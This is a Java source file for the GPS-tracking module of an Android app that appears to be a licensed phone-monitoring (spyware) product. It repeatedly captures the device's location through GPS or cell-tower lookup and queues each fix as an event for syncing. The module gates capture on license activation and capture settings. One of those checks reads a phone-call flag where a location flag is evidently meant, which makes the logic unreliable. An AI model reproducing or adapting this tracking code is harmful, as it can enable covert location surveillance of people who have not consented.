package com.fx.dalvik.location;

import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.events.location.CellLocationToLocation;
import com.fx.android.common.events.location.CellLocationToLocation.ConversionException;
import com.fx.dalvik.event.EventLocation;
import com.fx.dalvik.util.GeneralUtil;
import com.fx.dalvik.util.NetworkUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public final class GpsTracking implements LocationListenerManager.Callback {
	
	private static final String TAG = "GpsTracking";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private static GpsTracking sInstance;
	
	private boolean mIsEnabled = false;
	
	private Timer mRequestLocationTimer;
	private TimerTask mRequestLocationTask;
	
	private Timer mTimeoutTimer;
	private TimerTask mTimeoutTask;
	
	private Context mContext;
	private ConfigurationManager mConfigManager;
	private EventManager mEventManager;
	private LicenseManager mLicenseManager;
	private LocationListenerManager mLocationListenerManager;
	private LocationManager mLocationManager;

	public static GpsTracking getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new GpsTracking(context);
		}
		return sInstance;
	}
	
	private GpsTracking(Context context) {
		mContext = context;
		mConfigManager = Main.getInstance().getConfigurationManager();
		mEventManager = Main.getInstance().getEventsManager();
		mLicenseManager = Main.getInstance().getLicenseManager();
		mLocationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
	}
	
	public void enable() {
		if (mIsEnabled) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "register # Register FAILED!! Duplicated registration");
			}
			return;
		}
		
		mIsEnabled = true;
		
		if (! isCapturingEnabled()) {
    		if (LOCAL_LOGV) {
    			FxLog.v(TAG, "enable # Capture status is disabled ...[x]");
    		}
    		return;
    	}
		
		registerLocationListener();
		
    	if (LOCAL_LOGV) {
    		FxLog.v(TAG, "enable # Waiting for location ...[x]");
    	}
    	requestLocation();
	}
	
	public void disable() {
		if (mIsEnabled) {
			mIsEnabled = false;
			
			unregisterLocationListener();
			cancelTimeoutTask();
			
			if (mRequestLocationTask != null) {
				mRequestLocationTask.cancel();
				mRequestLocationTask = null;
			}
		}
	}
	
	@Override
	public void onLocationChanged(Location location) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onLocationChanged # ENTER ...");
		}
		
		boolean isActivated = mLicenseManager.isActivated();
		boolean capturedEnabled = mConfigManager.loadCaptureEnabled();
    	boolean capturedGpsEnabled = mConfigManager.loadCapturePhoneCallEnabled();
    	
    	if (!isActivated || !capturedEnabled || !capturedGpsEnabled) {
    		if (LOCAL_LOGV) {
    			FxLog.v(TAG, "onContentChange # GPS Capturing is disabled!! -> EXIT");
    		}
    		disable();
    		return;
    	}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"onLocationChanged # time: %s, provider: %s, lat: %f, long: %f, acc: %f", 
					GeneralUtil.getDateFormatter().format(new Date(location.getTime())), 
					location.getProvider(), location.getLatitude(), location.getLongitude(), 
					location.getAccuracy()));
		}
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Cancel timeout task
		cancelTimeoutTask();
		
		// Schedule for next request location listener
		scheduleRequestLocationTask();
		
		// Capture location
		captureLocation(location);
	}
	
	@SuppressWarnings("unused")
	private boolean hasBetterAccuracy(Location updatedValue, Location currentValue) {
		if (!currentValue.hasAccuracy() && updatedValue.hasAccuracy()) {
			return true;
		}
		if (currentValue.hasAccuracy() && updatedValue.hasAccuracy()) {
			return updatedValue.getAccuracy() < currentValue.getAccuracy();
		}
		else {
			return false;
		}
	}
	
	private boolean isCapturingEnabled() {
		boolean capturedEnabled = mConfigManager.loadCaptureEnabled();
    	boolean capturedLocationEnabled = mConfigManager.loadCaptureLocationEnabled();
    	
    	if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("isCapturingEnabled # result: %s", 
					capturedEnabled && capturedLocationEnabled));
		}
    	
    	return capturedEnabled && capturedLocationEnabled;
	}
	
	private void requestLocation() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "requestLocation # ENTER ...");
		}
		
		if (mLocationManager.getProviders(true).size() > 0) {
			// Register location listener
			registerLocationListener();
			
			// Schedule time out task
			scheduleTimeoutTask();
		}
		else {
				// Schedule for next request location listener
				scheduleRequestLocationTask();
				
				// Capture location finding by Google
				captureLocation(findGoogleLocation());
		}
	}
	
	private void registerLocationListener() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "registerLocationListener # ENTER ...");
		}
		if (mLocationListenerManager == null) {
			mLocationListenerManager = new LocationListenerManager(mContext, this);
		}
		mLocationListenerManager.register();
	}
	
	private void unregisterLocationListener() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "unregisterLocationListener # ENTER ...");
		}
		if (mLocationListenerManager != null) {
			mLocationListenerManager.unregister();
			mLocationListenerManager = null;
		}
	}
	
	private void scheduleTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "scheduleTimeoutTask # ENTER ...");
		}
		// Task delay
		long delay = mConfigManager.loadGpsTimeIntervalSeconds() * 1000;
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("scheduleTimeoutTask # delay: %d", delay));
		}
		
		// Timeout task
		mTimeoutTask = new TimerTask() {
			@Override
			public void run() {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "scheduleTimeoutTask.run # ENTER ...");
				}
				startTimeoutTask();
			}
		};
		
		// Timeout timer
		if (mTimeoutTimer == null) {
			mTimeoutTimer = new Timer();
		}
		mTimeoutTimer.schedule(mTimeoutTask, delay);
	}
	
	private void scheduleRequestLocationTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "scheduleRequestLocationTask # ENTER ...");
		}
		// Task delay
		long delay = mConfigManager.loadGpsTimeIntervalSeconds() * 1000;
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("scheduleRequestLocationTask # delay: %d", delay));
		}
		
		// Request location task
		mRequestLocationTask = new TimerTask() {
			@Override
			public void run() {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "mRequestLocationTask.run # ENTER ...");
				}
				requestLocation();
			}
		};
		
		// Request location Timer
		if (mRequestLocationTimer == null) {
			mRequestLocationTimer = new Timer();
		}
		mRequestLocationTimer.schedule(mRequestLocationTask, delay);
	}
	
	private void startTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "startTimeoutTask # GPS REQUEST TIMEOUT!!!");
		}
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Schedule for next request location listener
		scheduleRequestLocationTask();
		
		// Request location from Google service
		captureLocation(findGoogleLocation());
	}
	
	private void cancelTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "cancelTimeoutTask # ENTER ...");
		}
		if (mTimeoutTask != null) {
			mTimeoutTask.cancel();
			mTimeoutTask = null;
		}
	}
	
	private void captureLocation(Location location) {
		if (location == null) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "captureLocation # Location is NULL!! Ignore capturing");
			}
			return;
		}
		
		boolean isActivated = mLicenseManager.isActivated();
		boolean capturedEnabled = mConfigManager.loadCaptureEnabled();
    	boolean capturedGpsEnabled = mConfigManager.loadCapturePhoneCallEnabled();
    	
    	if (!isActivated || !capturedEnabled || !capturedGpsEnabled) {
    		if (LOCAL_LOGV) {
    			FxLog.v(TAG, "captureLocation # GPS Capturing is disabled!! -> EXIT");
    		}
    		disable();
    		return;
    	}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"captureLocation # time: %s, provider: %s, lat: %f, long: %f, acc: %f", 
					GeneralUtil.getDateFormatter().format(new Date(location.getTime())),
					location.getProvider(), location.getLatitude(), location.getLongitude(), 
					location.getAccuracy()));
		}
		
		EventLocation event = new EventLocation(
				location.getTime(), 
				location.getLatitude(), 
				location.getLongitude(), 
				location.getAltitude(), 
				(double) location.getAccuracy(), 
				0.0, 
				location.getProvider());
		
		mEventManager.insert(event);
	}
	
	private Location findGoogleLocation() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "findGoogleLocation # ENTER ...");
		}
		
		boolean hasInternet = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternet) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "findGoogleLocation # No Internet connection -> return null");
			}
			return null;
		}
		
		Location location = null;
		try {
			CellLocationToLocation cellLocationToLocation = 
				CellLocationToLocation.getInstance(mContext);
			
			location = cellLocationToLocation.getLocationOfCurrentCellLocation();
		} 
		catch (ConversionException e) {
			// Do nothing
		}
		
		return location;
	}
}
